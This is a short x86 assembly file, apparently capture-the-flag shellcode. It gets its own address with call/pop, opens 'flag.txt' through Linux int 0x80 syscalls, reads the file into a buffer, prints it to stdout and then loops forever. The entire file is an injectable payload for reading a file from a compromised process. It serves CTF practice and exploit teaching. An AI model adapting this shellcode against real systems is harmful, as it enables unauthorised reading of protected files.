[bits 32]

start:
  ; Load EIP for relative addressing.
  call @@
@@:
  pop esi
  
  ; Open the flag file.
  mov eax, 5
  lea ebx, [esi + (filename - @@)]
  xor ecx, ecx
  xor edx, edx
  int 0x80
  
  ; Load the file contents.
  mov ebx, eax
  mov eax, 3
  lea ecx, [esi + (buffer - @@)]
  mov edx, 0x100
  int 0x80

  ; Print out the flag.
  mov eax, 4
  mov ebx, 1
  lea ecx, [esi + (buffer - @@)]
  mov edx, 0x100
  int 0x80

  ; Enter an infinite loop.
  jmp $

filename: db 'flag.txt', 0
buffer: db 0
